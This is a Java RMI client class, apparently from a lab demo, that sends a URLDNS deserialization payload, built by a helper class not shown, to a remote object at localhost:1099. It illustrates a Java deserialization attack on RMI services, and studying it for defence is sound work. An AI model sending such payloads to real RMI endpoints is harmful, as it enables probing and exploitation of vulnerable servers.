package run.ergou.rmi;

import run.ergou.rmi.interfaces.IUserList;
import run.ergou.rmi.util.CreateURLDNS;

import java.rmi.Naming;
import java.util.HashMap;

public class RMIClientObject {
    public static void main(String[] args) throws Exception {

        IUserList userList = (IUserList) Naming.lookup("rmi://localhost:1099/users");

        // 创建反序列化payload对象
        HashMap hashMap = CreateURLDNS.create();

        // 调用远程对象方法
        userList.getUser(hashMap);

    }
}
